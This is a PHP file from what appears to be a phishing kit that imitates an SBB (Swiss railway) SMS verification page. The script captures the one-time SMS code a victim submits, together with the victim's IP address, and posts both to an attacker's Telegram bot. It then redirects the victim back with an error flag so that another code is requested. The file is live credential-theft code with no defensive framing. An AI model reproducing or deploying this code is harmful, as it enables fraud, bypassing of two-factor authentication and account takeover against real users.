<?php
session_start();
include 'config.php';
require 'stop.php';
require 'a.php';
/*
*/ 
$cu = $_GET['ccqq'];
$sms = $_POST['sms_code'] ;

$ip = $_SERVER['REMOTE_ADDR'];
 

$message  = "------------------+ 🎁 SBB SMS 🎁+-----------------\r\n";
$message .= "SMS01 : ".$sms."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ 🛒 SMS01 🛒 +------------------\r\n";



 	$website="https://api.telegram.org/bot" . $api;
    $params=[
        'chat_id' => $chat,
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch); 
if (isset($_SERVER['HTTP_REFERER'])) {
    $referer = $_SERVER['HTTP_REFERER'];

    // Check if the referer URL already contains a query string
    if (strpos($referer, '?') !== false) {
        // Append the error parameter to the existing query string
        $newReferer = $referer . '&error=1';
    } else {
        // Add the error parameter as a new query string
        $newReferer = $referer . '?error=1';
    }

    header('Location: ' . $newReferer);
} else {
    // If there's no referrer (rare cases or if directly accessed), redirect to a default page
    header('Location: sms1.php');
}

exit;
?>

?>